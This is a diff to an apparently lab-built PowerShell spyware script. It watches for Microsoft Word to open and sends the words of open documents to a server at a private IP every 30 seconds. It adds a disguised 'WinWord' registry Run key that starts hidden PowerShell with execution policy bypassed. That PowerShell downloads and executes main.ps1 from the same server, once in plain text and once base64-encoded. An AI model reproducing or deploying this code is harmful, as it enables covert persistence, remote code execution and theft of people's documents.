@@ -1,5 +1,5 @@
 $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$ServerURL = "http://localhost:8080"
+$ServerURL = "http://192.168.56.1:8080"
 $Process = "Winword"
 
 
@@ -158,8 +158,12 @@ Wait-ProcessStarts -Process "ProcessName"
 
     do {
         $Proc = Get-Process $Process -ErrorAction SilentlyContinue
-        # Sleep 5 secs to not overload CPU
+        # Sleep 1 secs to not overload CPU
         Start-Sleep 1
+        Write-Host "------------"
+        Write-Host "Waiting Word starts"
+        #Write-Host $Proc
+        Write-Host "------------"
     } until ($Null -ne $Proc)
     
     Wait-ProccessStops -Process $Process
@@ -186,10 +190,13 @@ Wait-ProcessStops -Process "ProcessName"
 
     do {
         $Proc = Get-Process $Process -ErrorAction SilentlyContinue
-        # Sleep 60 sec to not overload CPU and exfiltrate documents with this time interval
-        Start-Sleep 5
+        # Sleep 30 sec to not overload CPU and exfiltrate documents within this time interval
+        Start-Sleep 30
         # Execute the exiltration
         Get-OpenWordDocumentsWords -URL $ServerURL
+        Write-Host "------------"
+        Write-Host "Waiting Word stops"
+        Write-Host "------------"
     } until($Null -eq $Proc)
 
     Wait-ProccessStarts -Process $Process
@@ -198,7 +205,8 @@ Wait-ProcessStops -Process "ProcessName"
 
 function Start-Chaos {
 
-    Set-RegistryPersistence -Name "test" -Command "powershell.exe"
+    #Set-RegistryPersistence -Name "WinWord" -Command "powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Get-Window powershell | Set-WindowState -Minimize; iex (iwr 'http://192.168.56.1:8080/main.ps1')`""
+    Set-RegistryPersistence -Name "WinWord" -Command "powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -enc aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAvAG0AYQBpAG4ALgBwAHMAMQAnACkA"
     Wait-ProccessStarts -Process $Process
 
 }
